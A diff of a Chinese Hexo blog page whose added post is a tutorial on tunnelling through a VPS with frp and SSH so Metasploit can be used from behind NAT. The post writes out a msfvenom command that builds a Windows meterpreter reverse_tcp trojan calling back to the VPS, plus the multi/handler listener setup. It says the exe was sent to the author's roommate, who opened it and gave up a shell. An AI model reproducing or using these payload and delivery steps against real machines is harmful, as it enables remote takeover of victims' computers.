@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="MSF," />
 
 
 
@@ -79,13 +79,24 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Sch0lar&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/tags/js/index.html">
+<meta name="description" content="很多时候我们需要内网穿透来进行一些操作 因为我们本地是内网而且在没有端口转发的情况下 msf不能很好的去使用。所以今天来总结一下 利用ssh frp实现内网穿透后 利用msf的过程。 首先我们要准备一台公网vps。然后一台内网kali。一个目标（这里那我舍友的做实验） 12vps : 39.168.xxx.xkali: 192.168.221.128 frp内网穿透首先现在frp到vps和kali">
+<meta name="keywords" content="MSF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssh与frp实现内网穿透">
+<meta property="og:url" content="http://yoursite.com/2020/03/16/ssh与frp实现内网穿透/index.html">
 <meta property="og:site_name" content="Sch0lar&#39;s Blog">
+<meta property="og:description" content="很多时候我们需要内网穿透来进行一些操作 因为我们本地是内网而且在没有端口转发的情况下 msf不能很好的去使用。所以今天来总结一下 利用ssh frp实现内网穿透后 利用msf的过程。 首先我们要准备一台公网vps。然后一台内网kali。一个目标（这里那我舍友的做实验） 12vps : 39.168.xxx.xkali: 192.168.221.128 frp内网穿透首先现在frp到vps和kali">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ftp.bmp.ovh/imgs/2020/03/39ffa38e70793683.png">
+<meta property="og:image" content="https://ftp.bmp.ovh/imgs/2020/03/22dd2fbed00f6cd8.png">
+<meta property="og:image" content="https://ftp.bmp.ovh/imgs/2020/03/4754d4a61bdceebc.png">
+<meta property="og:image" content="https://ftp.bmp.ovh/imgs/2020/03/f0ee75ac6ef968d8.png">
+<meta property="og:image" content="https://ftp.bmp.ovh/imgs/2020/03/698792c802d27830.png">
+<meta property="og:updated_time" content="2020-03-16T12:48:55.414Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sch0lar&#39;s Blog">
+<meta name="twitter:title" content="ssh与frp实现内网穿透">
+<meta name="twitter:description" content="很多时候我们需要内网穿透来进行一些操作 因为我们本地是内网而且在没有端口转发的情况下 msf不能很好的去使用。所以今天来总结一下 利用ssh frp实现内网穿透后 利用msf的过程。 首先我们要准备一台公网vps。然后一台内网kali。一个目标（这里那我舍友的做实验） 12vps : 39.168.xxx.xkali: 192.168.221.128 frp内网穿透首先现在frp到vps和kali">
+<meta name="twitter:image" content="https://ftp.bmp.ovh/imgs/2020/03/39ffa38e70793683.png">
 
 
 
@@ -115,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/js/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/16/ssh与frp实现内网穿透/"/>
 
 
 
 
 
-  <title>标签: js | Sch0lar's Blog</title>
+  <title>ssh与frp实现内网穿透 | Sch0lar's Blog</title>
   
 
 
@@ -140,7 +151,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -284,54 +295,195 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>js<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/16/ssh与frp实现内网穿透/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sch0lar">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sch0lar's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2019/12/11/备考1+x前端证书/" itemprop="url">
-              
-                <span itemprop="name">备考1+x前端证书</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">ssh与frp实现内网穿透</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2019-12-11T19:06:43+08:00"
-              content="2019-12-11" >
-          12-11
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-16T16:32:55+08:00">
+                2020-03-16
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网/" itemprop="url" rel="index">
+                    <span itemprop="name">内网</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>很多时候我们需要内网穿透来进行一些操作 因为我们本地是内网而且在没有端口转发的情况下 msf不能很好的去使用。所以今天来总结一下 利用ssh frp实现内网穿透后 利用msf的过程。</p>
+<p>首先我们要准备一台公网vps。然后一台内网kali。一个目标（这里那我舍友的做实验）</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">vps</span> : 39<span class="selector-class">.168</span><span class="selector-class">.xxx</span><span class="selector-class">.x</span></span><br><span class="line"><span class="selector-tag">kali</span>: 192<span class="selector-class">.168</span><span class="selector-class">.221</span><span class="selector-class">.128</span></span><br></pre></td></tr></table></figure>
+<h2 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h2><p>首先现在frp到vps和kali</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/fatedier/</span>frp<span class="regexp">/releases</span></span><br></pre></td></tr></table></figure>
+<p><strong>vps上启动frps    服务端</strong></p>
+<p><strong>kali上启动frpc    客户端</strong></p>
+<h3 id="vps启动frps"><a href="#vps启动frps" class="headerlink" title="vps启动frps"></a>vps启动frps</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim frps.ini</span><br><span class="line">bind_port = <span class="number">7000</span><span class="comment">//默认就是这样不用去修改</span></span><br><span class="line">启动frps： ./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>
+<p><img src="https://ftp.bmp.ovh/imgs/2020/03/39ffa38e70793683.png" alt=""></p>
+<h3 id="kali启动frpc"><a href="#kali启动frpc" class="headerlink" title="kali启动frpc"></a>kali启动frpc</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">vim</span> <span class="selector-tag">frpc</span><span class="selector-class">.ini</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ftp.bmp.ovh/imgs/2020/03/22dd2fbed00f6cd8.png" alt=""></p>
+<p>39.xx那个是vps的地址 7000是frpc的工作端口必须和上面frps保持一致</p>
+<p>后面是服务器用6000端口转发到本机的5555端口 最后启动frpc</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动<span class="string">frpc:</span> .<span class="regexp">/frpc -c ./</span>frpc.ini</span><br></pre></td></tr></table></figure>
+<h3 id="使用msf测试木马上线"><a href="#使用msf测试木马上线" class="headerlink" title="使用msf测试木马上线"></a>使用msf测试木马上线</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp lhost=<span class="number">39</span><span class="selector-class">.xxx</span><span class="selector-class">.xxx</span><span class="selector-class">.x</span> lport=<span class="number">6000</span> -f exe x&gt;ma.exe</span><br></pre></td></tr></table></figure>
+<p>生成木马 地址设置为你的vps。端口设置成上面服务器用的端口6000</p>
+<p>最后我们监听kali本地的5555端口等待上线。</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost 127.0.0.1</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport 5555</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>最后发给舍友</p>
+<p><img src="https://ftp.bmp.ovh/imgs/2020/03/4754d4a61bdceebc.png" alt=""></p>
+<p>舍友双击以后反弹回了shell</p>
+<p><img src="https://ftp.bmp.ovh/imgs/2020/03/f0ee75ac6ef968d8.png" alt=""></p>
+<h2 id="ssh内网穿透"><a href="#ssh内网穿透" class="headerlink" title="ssh内网穿透"></a>ssh内网穿透</h2><p>因为这里kali网络有点问题所以用ssh并没有成功。也懒得去搞桥接了 这里我用我本机来测试 把本机端口映射到公网上。和msf道理一样的。</p>
+<p>本机上执行</p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh -fCNR 7777:192.168.1.106:80 root@39.xxx.xxx.x</span><br><span class="line">-<span class="ruby">f 将连接送入后台执行 不占用当前shell</span></span><br><span class="line"><span class="ruby">-C 压缩传输 提高传输速度</span></span><br><span class="line"><span class="ruby">-N 建立隐藏链接 已经建立链接 但是看不到会话</span></span><br><span class="line"><span class="ruby">-R 远程端口转发</span></span><br><span class="line"><span class="ruby">-L 本地端口转发</span></span><br><span class="line"><span class="ruby">-D 动态端口转发</span></span><br><span class="line"><span class="ruby">-p 指定ssh端口</span></span><br><span class="line"><span class="ruby">把本地的<span class="number">80</span>端口 反弹到vps的<span class="number">7777</span>端口上</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ftp.bmp.ovh/imgs/2020/03/698792c802d27830.png" alt=""></p>
+<p>如果还是不懂怎么用ssh进行转发参考 <a href="https://www.cnblogs.com/hac425/p/9416774.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416774.html</a></p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/MSF/" rel="tag"><i class="fa fa-tag"></i> MSF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/08/命令执行漏洞整理/" rel="next" title="命令执行漏洞整理">
+                <i class="fa fa-chevron-left"></i> 命令执行漏洞整理
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -339,6 +491,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -359,8 +515,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -472,6 +637,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#frp内网穿透"><span class="nav-number">1.</span> <span class="nav-text">frp内网穿透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#vps启动frps"><span class="nav-number">1.1.</span> <span class="nav-text">vps启动frps</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kali启动frpc"><span class="nav-number">1.2.</span> <span class="nav-text">kali启动frpc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用msf测试木马上线"><span class="nav-number">1.3.</span> <span class="nav-text">使用msf测试木马上线</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh内网穿透"><span class="nav-number">2.</span> <span class="nav-text">ssh内网穿透</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -612,6 +793,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
